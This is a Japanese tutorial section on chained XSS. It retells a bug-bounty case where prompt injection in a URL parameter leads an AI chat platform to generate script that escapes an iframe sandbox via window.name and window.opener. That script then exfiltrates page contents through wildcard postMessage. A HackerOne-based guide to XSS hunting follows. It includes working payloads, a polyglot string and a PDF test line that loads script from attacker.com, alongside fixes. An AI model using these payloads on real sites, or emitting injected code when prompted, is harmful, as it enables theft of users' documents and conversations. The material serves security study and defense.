## 複合連鎖と実務的な発見手法

これまでの章では、反射型・格納型・DOM-basedといった「単体のXSS」を扱ってきた。しかし実際のバグバウンティやレッドチーム演習で最も高額な報奨や最も深刻なインパクトを生むのは、**単体では中程度の重大度にしかならない複数の弱点を鎖のようにつなぐ（chain）ことで、初めてXSSやデータ漏洩に到達するケース**である。本節では、(1) `postMessage` の誤設定・AIプロンプトインジェクション・サンドボックス脱出を組み合わせた実例、(2) 熟練した研究者がXSSを「どうやって見つけているか」という実務的な方法論、の2つを軸に解説する。

### 6.4.1 なぜ「連鎖」が重要なのか

単一の脆弱性は、開発側も脆弱性スキャナも比較的発見しやすい。しかし以下のような組み合わせは、個々のパーツを別々にレビューしても気づかれにくい。

- **origin検証の欠落**（`postMessage` のリスナーが送信元を確認していない）
- **サンドボックス化されたコンテキスト**（`iframe sandbox` 属性やAIエージェントの「安全なはずの」実行環境）
- **信頼境界をまたぐ入力**（AIモデルへのプロンプト、他ウィンドウからのメッセージ）

これらは個別に見ると「情報漏洩の可能性がある設定ミス」「モデルの応答がおかしくなる程度の問題」「iframeの分離がやや甘い」といった、単体ではCVSSスコアが中程度に留まりがちな指摘になる。ところが、送信元検証がないpostMessageハンドラに、プロンプトインジェクションで生成した悪意あるHTML/JSペイロードを流し込み、そのハンドラがサンドボックス外のDOM操作を許してしまう——という具合に**出力が次の脆弱性の入力になる**形で鎖をつなぐと、最終的に任意コード実行（XSS）とデータ窃取に到達する。これは「複合脆弱性（chained vulnerability）」と呼ばれ、近年のバグバウンティレポートで急増している攻撃パターンである。

### 6.4.2 postMessage誤設定 × AIプロンプトインジェクション × サンドボックス脱出

以下は、研究者 Source_To_Sink 氏が2026年3月にInfoSec Write-upsへ投稿した実例（対象はAIチャット/ドキュメント処理を行うプラットフォーム。企業名・URLは記事内で `[REDACTED]` 表記）を、原文の構造に沿って再構成したものである。単発の脆弱性としては「中程度」にしか評価されない3つの弱点——**postMessageの誤設定**、**AIプロンプトインジェクション**、**サンドボックス脱出**——を組み合わせることで、任意のJavaScript実行と機微データの持続的な持ち出し（exfiltration）にまで到達している。

#### 背景: postMessageとサンドボックスの基本原理

`window.postMessage()` は、異なるオリジン（プロトコル・ホスト・ポートの組が異なるページ）間で安全にメッセージをやり取りするためのAPIである。受信側は次のように実装するのが正しい。

```js
window.addEventListener('message', (event) => {
  if (event.origin !== 'https://trusted.example.com') return; // origin検証
  handleMessage(event.data);
});
```

`event.origin` の検証を怠る、あるいは送信側が `*`（任意オリジン）を指定して `postMessage` を送っていると、**どのオリジンの誰からでもメッセージを受け取れる／送りつけられる**状態になる。原文はこの問題を次のように定式化している。

> "If a sandboxed iframe uses postMessage("*") and accepts messages without origin validation, the sandbox provides a false sense of security" — 「サンドボックス化されたiframeが `postMessage("*")` を使い、origin検証なしにメッセージを受け付けているなら、サンドボックスは（実際には機能しない）安心感を与えているに過ぎない」

つまり `message` イベントリスナーは、ブラウザから見れば単なる公開エンドポイントである。origin検証をしないコードは、認証なしで誰でも叩ける公開APIを晒しているのと本質的に同じであり、記事はここから「**すべてのpostMessageハンドラは公開APIエンドポイントとして扱い、呼び出し元の検証・入力のサニタイズ・出力の制限を行うべきだ**」と結論づけている。

一方、`<iframe sandbox>` 属性は、埋め込んだコンテンツの権限を制限する仕組みである。

```html
<iframe src="untrusted.html" sandbox="allow-scripts"></iframe>
```

ここで注意すべき原理がある。`sandbox="allow-scripts"` は**スクリプトの実行そのものは許可**しており、`postMessage` による通信も制限しない。サンドボックスが制限するのは、主にCookie／ストレージへのアクセスや同一オリジン権限、トップレベルナビゲーションといった別の権限である。したがって「sandbox属性さえ付けておけば、中で動くコードは無害だ」という前提は誤りであり、記事はこのギャップ（sandboxが保護するものと保護しないものの乖離）こそが脆弱性チェーンの土台になっていると指摘する。

#### ステップ1: AIプロンプトインジェクションでサンドボックス側の実行を仕込む

このプラットフォームは、ユーザーがURLのクエリパラメータ `q` に入力を渡すと、その文字列がチャット欄に自動入力され、AIがそれに応答してHTMLを生成する構造になっていた。

```
https://[REDACTED].com/chat?q=I%20am%20interested%20in%20apples%20make%20me%20a%20web%20page%20in%20html...
```

この `q` パラメータの中に、AIへの本来の指示を上書きするような文字列（**プロンプトインジェクション**。AIへの入力に、本来の指示を逸脱させる文字列を混入させ、意図しない出力を引き出す攻撃）を混ぜ込むことで、攻撃者は「AIに特定のHTML/JSを含む応答を確実に生成させる」ことができる。生成されたHTMLは、サンドボックス化されたiframe内でレンダリングされる仕様になっていた。攻撃者はここへ、iframe内で実行させたい悪意あるスクリプトを注入する。

```js
let scriptContent = `
  window.parent.postMessage({"type":"itworked"}, "*");
  setInterval(() => {
    for (let i = 0; i < window.parent.opener.frames.length; i++) {
      let documentBody = window.parent.opener.frames[i].document.body.innerHTML;
      if (typeof documentBody === "string") {
        window.parent.postMessage({"type":"docbody","body":documentBody}, "*");
      }
    }
  }, 1000);
`;
```

なぜこれが「XSS」として成立するか。プロンプトインジェクションによってAIに生成させたこの文字列が、サンドボックス化されたiframeのコンテキストで実行される時点で、**攻撃者が自由に組み立てた任意のJavaScriptが、被害者のブラウザ上で動いている**ことになる。これはsandbox属性が防ぐはずの「未検証コンテンツの実行」そのものであり、AIの出力をレンダリング用のsink（`innerHTML`や新規iframeの`srcdoc`など、文字列が最終的にコードやHTMLとして解釈される代入先）にそのまま流し込む設計になっていたことが根本原因である。

#### ステップ2: window.name永続化によるサンドボックス脱出

問題は、このスクリプトが「サンドボックス化されたiframeの中」でしか動いていないという点である。サンドボックスの中だけであれば、被害範囲はそのiframe自身のDOMに限られるはずだった。ここで使われたのが、ブラウザの**`window.name`永続化**という古典的な性質である。

`window.name` はウィンドウ（タブ）に紐づく文字列プロパティで、**そのウィンドウが別のオリジンへナビゲート（遷移）しても値が保持される**という、後方互換性のために維持されてきた挙動を持つ。原文はこれを次のように説明している。

> "window.name persists across navigations, and browsers maintain this behavior for backward compatibility" — 「`window.name`はページ遷移をまたいで保持され、ブラウザはこの挙動を後方互換性のために維持している」

攻撃者はこの性質を利用し、複数のウィンドウ間でのオリジンをまたいだ参照関係を構築する。攻撃フローは次の通りである。

1. **ウィンドウA**（攻撃者ページ、`first.html`）: 事前に `window.name = "Baymax"` を設定しておく。
2. ウィンドウA上の「Loginボタン」のようなUI要素をユーザーにクリックさせ、`second.html` を開く（**ウィンドウB**）。
3. ウィンドウB内で `window.open("https://[REDACTED].com/chat?q=...", "Baymax")` を実行する。第2引数にウィンドウ名 `"Baymax"` を指定して `window.open()` を呼ぶと、ブラウザは**同じ名前を持つ既存のウィンドウ（ここではウィンドウA）を再利用してそこへナビゲートする**という仕様がある。これによりウィンドウAは被害者のプラットフォームのチャットページへ強制的に遷移させられるが、`window.name` の値 `"Baymax"` 自体は保持されたままになる。
4. ウィンドウAは今やターゲットプラットフォームのページであり、その中にステップ1で仕込んだプロンプトインジェクション経由のAI応答が読み込まれ、サンドボックスiframe（0番目のフレームなど）としてレンダリングされる。
5. ウィンドウBは `window.opener` （自分を開いた元のウィンドウへの参照）経由でウィンドウAにアクセスできる。すなわち `window.opener.frames[0]` のようにして、**別オリジンであるはずのターゲットページ内のサンドボックスiframeへの参照を、攻撃者が完全に制御するウィンドウBから直接手繰り寄せられる**ことになる。

この一連の流れが成立する理由は、`window.name` の永続化、`window.open()` の名前付きウィンドウ再利用、そして `window.opener`/`frames` によるフレーム階層トラバーサル（`window.parent`・`window.top`・`window.opener`・`frames` を辿って、本来は直接アクセスできないはずの別のウィンドウ／フレームの参照を得る操作）という、いずれも仕様上正当なブラウザ機能を**組み合わせて使う**ことで、サンドボックスの権限境界を実質的に迂回している点にある。サンドボックス属性そのものにバグがあるわけではなく、「サンドボックスの外側にある、ブラウザの正規のクロスウィンドウ機構」を踏み台にしているのが本質である。

#### ステップ3: origin未検証のpostMessageによるデータ持ち出し

サンドボックス内で実行されているスクリプト（ステップ1のペイロード）は、1秒ごとに `window.parent.opener.frames[i].document.body.innerHTML` を読み取り、`postMessage({"type":"docbody","body":documentBody}, "*")` として送信し続ける。受信側（攻撃者が用意したページ、あるいは前述のウィンドウA/B）がこの `message` イベントをリッスンしていれば、送信元のorigin検証がない限りメッセージを受理してしまう。

```js
// 送信側: ワイルドカードOriginを使用
window.parent.postMessage({ type: "docbody", body: htmlBody }, "*");

// 受信側: Origin検証がない
window.addEventListener("message", (event) => {
  if (event.data.type === "start-received") {
    renderContent(event.data.input, event.data.language);
  }
});
```

第二引数に `"*"` を指定して送信すると、**そのメッセージはどのオリジンで動いているリスナーにも届いてしまう**（送信側のorigin制限）。加えて受信側も `event.origin` を確認していないため（受信側のorigin検証欠落）、この2つが揃うことで、攻撃者が完全に制御するページが、被害者のブラウザ内で継続的に生成される機微情報（アップロードされたドキュメントの内容、AIの生成レスポンス、会話履歴など）を**リアルタイムで盗聴し続けられる**状態が成立する。`setInterval` によって1秒ごとにポーリングしているため、被害者がページを開いている間、情報漏洩は持続的に発生する。

#### なぜ「サンドボックスがあるから安全」という前提が崩れるのか

原文が強調しているのは、`sandbox` 属性が保護する範囲と、この攻撃チェーンが突いた範囲がそもそも一致していないという点である。`sandbox="allow-scripts"` はスクリプト実行そのものは止めず、`postMessage` 通信も制限しない。加えて `window.opener` 経由の参照は、`sandbox` 属性の制約とは別の仕組み（ウィンドウ間の開設者参照）であるため、サンドボックス設定だけでは塞げない。これが「個別には中程度の3つの弱点が、鎖として繋がると重大なインパクトになる」理由である。

#### 修正方法

**Fix 1: origin検証を許可リストとの厳密一致で行う**

```js
const ALLOWED_ORIGINS = [
  "https://[REDACTED].com",
  "https://www.[REDACTED].com"
];
window.addEventListener("message", function(event) {
  if (!ALLOWED_ORIGINS.includes(event.origin)) {
    console.warn("Rejected message from unauthorized origin:", event.origin);
    return;
  }
  // 処理続行
});
```

**Fix 2: 受け取ったHTMLは必ず無害化する**

```js
const sanitized = DOMPurify.sanitize(content, {
  FORBID_TAGS: ['script', 'iframe', 'object', 'embed'],
  FORBID_ATTR: ['onerror', 'onload', 'onclick', 'onmouseover']
});
```

**Fix 3: `postMessage` の送信先は必ず明示のオリジンにする**

```js
iframe.contentWindow.postMessage(data, "https://cdn.example.cloudfront.net");
```

`"*"` を使わず送信先オリジンを固定すれば、意図しないオリジンにメッセージが漏れることはなくなる。

**Fix 4: `window.name` を悪用したクロスウィンドウ攻撃への対策**

```js
// Cross-Origin-Opener-Policy: same-origin ヘッダーが最も効果的
if (window.name) {
  window.name = "";
}
```

`Cross-Origin-Opener-Policy: same-origin` を送出すると、クロスオリジンのウィンドウ間で `window.opener` 参照自体が切り離されるため、ステップ2で示したフレーム階層トラバーサルの起点を断つことができる。ページ側で不要な `window.name` を明示的にクリアすることも補助的な対策になる。

#### 実務者への教訓

記事が繰り返し強調しているのは、**単体の弱点を見つけて終わりにしない**という視点である。原文の結論を要約すると次のようになる。

- postMessage誤設定（origin検証欠落）を見つけたら、それ単体のバグとして報告するだけでなく、AIプラットフォームであればプロンプトインジェクションと、iframeがあればサンドボックス脱出の可能性と、組み合わせられないかを必ず検討する。
- `window.name` の永続性は、あるページで値を仕込んでおき、被害者が全く別のオリジンへ遷移した後もその値を読み出せるという、クロスウィンドウでの標的化に使える古典的だが見落とされやすい手法である。
- `window.top`・`window.parent`・`window.opener` を辿るフレーム階層トラバーサルは、本来到達できないはずの上位・関連フレームのコンテキストへスコープを拡大する定石であり、postMessageの検証漏れと組み合わせると威力が増す。
- 「個別には中程度の脆弱性が、連鎖することで重大な侵害を実現する」——バグバウンティのトリアージにおいても、単一issueのCVSSだけでなく、他の既知の弱点との組み合わせ可能性を評価する視点が要求される。

> 出典: PostMessage Misconfiguration + AI Prompt Injection + Sandbox Escape = XSS & Data Exfiltration（Source_To_Sink, InfoSec Write-ups, 2026年3月） — https://infosecwriteups.com/postmessage-misconfiguration-ai-prompt-injection-sandbox-escape-xss-data-exfiltration-d1d29821a2de

### 6.4.3 実務者はどうやってXSSを見つけているか

続いて、単発の脆弱性探しの「型」に話を移す。ここではHackerOneが2026年4月に公開した実務者向けガイド（著者: Haoxi Tan, Security Researcher）の要点を紹介する。

記事はまず、Cross-Site Scripting（XSS）を「被害者のブラウザ上で任意のJavaScriptを実行させる、Webアプリケーションで一般的な脆弱性の一種」と定義した上で、反射型・格納型・DOM-basedという基本3分類に加えて、**ブラインドXSS（Blind XSS, bXSS）**や、PDF・Electronアプリのような「異例の場所」に現れるXSSも実務では頻出すると指摘し、発見のための具体的な手法とツールを提示している。

#### (1) ポリグロットペイロードによる網羅的プロービング

**ポリグロット（polyglot）**とは、複数の異なるコンテキスト（HTML属性内、JS文字列内、URL内など）のいずれに挿入されても実行が成立するように設計された、汎用性の高いペイロードを指す。記事が挙げる例は次のようなものである。

```
" onclick=alert(1)//<button ' onclick=alert(1)//> */ alert(1)//
```

なぜ動くか。この文字列は「属性値の終端 `"`」「HTMLタグの新規開始 `<button ...>`」「別の引用符パターン `'`」「JSコメントアウト `//`」「ブロックコメント `*/`」といった、複数の異なる構文コンテキストへの脱出手段を1つの文字列の中に並置している。挿入先が属性値の中であれ、JS文字列リテラルの中であれ、コメントの直後であれ、いずれかの断片がその文脈にマッチしてコンテキストから脱出し、`onclick=alert(1)` や `alert(1)` が実行可能な位置に着地する。実務では、入力がどのコンテキストに出力されるか事前に分からないことが多いため、まずポリグロットを投入して「そもそも何らかの形でXSSが成立しそうか」を素早く判定し、その後コンテキストを絞った個別ペイロードで確定させる、という二段階のアプローチが取られる。記事は具体的なペイロード集として **PayloadsAllTheThings**（GitHubのXSS Injectionセクション）、**HackTricks**のXSS解説、そして自動テスト用の **Auto_Wordlists** を挙げている。

#### (2) 自動化ツールと手動テストの使い分け

記事は自動化ツールとして **Dalfox**（反射型・蓄積型XSSの両方に対応）、**XSStrike**（反射型専用）、そしてブラインドXSS検出用のコールバックプラットフォームである **xsshunter** を紹介しつつ、次のように限界を明言している。

> "automated tools for finding anything beyond low-hanging reflected XSS are limited" — 「低難度の反射型XSSを超える範囲を見つけるための自動化ツールは限定的である」

つまり、自動スキャナは「入力をそのまま出力に反映する」ような単純な反射型XSSの検出には有効だが、フィルタバイパスや複雑なDOMの再解釈が絡む深い脆弱性の発見には手動テストが不可欠だという実務的な位置づけを示している。

#### (3) 反射型XSS(RXSS)の典型的な発見箇所

記事が挙げる発見場所は、URLパラメータ（検索クエリ、エラーメッセージの表示欄）、リダイレクトパラメータ（ログイン後のPOSTリダイレクトに使われる `returnTo` のようなパラメータ）、そして `javascript:` プロトコルを含む特殊なURLである。具体例として、Shopifyの `returnTo` パラメータで発見された事例が紹介されている。

#### (4) 格納型XSSとMarkdown/Mutation XSSへの注意

格納型XSS（蓄積型XSS）の典型的な発見箇所は、コメント欄、ユーザープロフィールデータ、プライベートメッセージ、メール機能である。記事は特に「Markdownテキストの HTML への変換」や「不正なHTML構文をブラウザが自動修正する過程」で発生する**Mutation XSS（mXSS）**に注意を促し、GitLabのウィキ機能での事例を挙げている。これは第6章の別節で扱ったMailspringの事例と同じ、サニタイザとレンダラのパース差分という原理に基づくものである。

#### (5) ブラインドXSS(bXSS)による「見えない」実行面の発見

ブラインドXSSは、ペイロードの実行結果を攻撃者自身が直接観測できない点が特徴の格納型XSSである。記事が挙げる典型的な標的は、HTTPヘッダー（User-Agent、Cookie）、アカウント登録フォーム、フィードバック機能、ユーザー名・メールアドレス欄である。ペイロードは通常のサニタイズ漏れと同じ形で仕込まれるが、実行される場所とタイミングを攻撃者が事前に知り得ないため、**xsshunter**のような外部コールバックエンドポイントを使い、どのフォームに仕込んだペイロードが、いつ、どの管理画面で発火したかを追跡する運用が必要になる。管理者権限を持つバックオフィス画面で発火することが多いため、単純な反射型XSSより被害範囲が大きくなりやすい。

#### (6) DOM型XSSの検出: Burp Suite DOM Invader

DOM-basedXSSの検出について、記事は **Burp Suite の DOM Invader**（source/sinkの流れを解析するBurp Suiteの拡張機能）を明示的に推奨している。手順は次の通りである。

1. DOM Invaderで「キャナリ」（追跡用のユニークな文字列）を生成する。
2. テスト対象のフィールドにそのキャナリを挿入する。
3. DOM Invaderがキャナリの流れを追跡し、どのsink（出力先）に到達したかを自動検出する。
4. 検出されたsinkの種類に応じてペイロードを調整し、実際にエクスプロイトを組み立てる。

実例として、Gin and Juice Shop（PortSwiggerが公開する練習用の脆弱アプリケーション）で、`<img src>` 属性経由で `onload` ペイロードを挿入した事例が紹介されている。

#### (7) 異例の場所でのXSS: PDFとElectronアプリ

記事はXSSが「Webブラウザの中だけの脆弱性」ではないことも強調している。

**PDFにおけるXSS**は、サーバーサイドでPDFを生成・処理する機能に対して行われ、SSRF（Server-Side Request Forgery）やLFI（Local File Inclusion）へと連鎖しうる。テスト例として次が挙げられている。

```html
<img src="x" onerror="document.write('test')" />
<script src="http://attacker.com/myscripts.js"></script>
```

このようなペイロードをPDF生成に使われる入力（HTMLをPDF化するライブラリへの入力など）に混入させ、生成側のレンダリングエンジンでJavaScriptが実行されるかを確認する。記事はSlackでこの種の脆弱性が報告され、約5,000ドルの報奨金が支払われた例を紹介している。

**Electronアプリケーション**については、検出ツールとして **Electronegativity**（Electronアプリのセキュリティ設定を静的解析するツール）が挙げられている。確認すべきリスク要因は `nodeIntegration: true` の設定であり、これが有効な状態でXSSが成立すると、`require('child_process').exec()` のような呼び出しを通じてXSSがRCE（Remote Code Execution）にエスカレーションしうる。記事はRocket ChatデスクトップアプリのMarkdownパーサーに存在したXSSが、ローカルマシンでのコード実行にまで発展した事例を挙げている。これは前節で扱ったMailspringのmXSS→RCE連鎖と同じ原理（Electronの権限昇格）である。

#### 統計データと実務的示唆

記事は最新の Hacker-Powered Security Report を引用し、2025年単年で **13,000件以上の有効なXSSレポート**が確認されたとし、XSSが現代のWebアプリケーションにおいて依然として高頻度に発見される脆弱性クラスであると位置づけている。締めくくりとして記事は次のように述べている。

> "nothing beats the curiosity, creativity, and persistence of a security researcher" — 「セキュリティ研究者の好奇心・創造性・粘り強さに勝るものはない」

つまり、構造化されたテスト手順（ポリグロット→コンテキスト特定→フィルタバイパス/ブラインドXSSでの深掘り）と、既存のツール・ペイロード集の活用を土台としつつも、最終的に高難度の脆弱性を見つけるのは、アプリケーション固有の実装の癖に対する探究心と試行錯誤であるという実務的な結論である。

> 出典: How to Find XSS: Techniques Security Researchers Use in Real Environments（Haoxi Tan, HackerOne Blog, 2026年4月1日） — https://www.hackerone.com/blog/how-find-xss-techniques-security-researchers-use-real-environments

### 6.4.4 本節の要点

- 個々には中程度の重大度に見える弱点（postMessageのorigin検証漏れ、AIプロンプトインジェクション、`window.name`永続化やフレーム階層トラバーサルによるサンドボックス脱出）でも、**出力を次の入力につなぐ連鎖**を組み立てることで、フルチェーンのXSS・持続的なデータ漏洩に到達しうる。
- `sandbox` 属性は「安全な箱」ではなく、あくまでCookie・ストレージ・トップレベルナビゲーションなど一部の権限を絞るための仕組みに過ぎない。スクリプト実行自体や `postMessage` 通信、`window.opener` 経由の参照は制限されないため、これらを踏み台にした脱出が成立する。
- AI生成コンテンツは、通常のユーザー入力と同様（あるいはそれ以上に）信頼できない外部データとして扱い、DOM sinkへ渡す前に必ずサニタイズし、`postMessage` は送受信双方でオリジンを厳密に検証する。
- 実務での発見は「ポリグロットで広く当たりをつける→自動ツール(Dalfox/XSStrike)と手動テストを使い分ける→コンテキスト特化ペイロードで確定→DOM Invaderでsource/sinkを可視化する→ブラインドXSSやPDF・Electronのような異例の実行面まで潰す」という段階的なプロセスであり、パーサの再解釈・権限昇格という共通原理を理解していれば、個別のペイロード暗記に頼らず応用が利く。
- 見つけた脆弱性を単体の報告で終わらせず、「他の既知の弱点と組み合わせて影響範囲を拡大できないか」を常に問い直す姿勢が、複合連鎖の発見と高い報奨評価につながる。
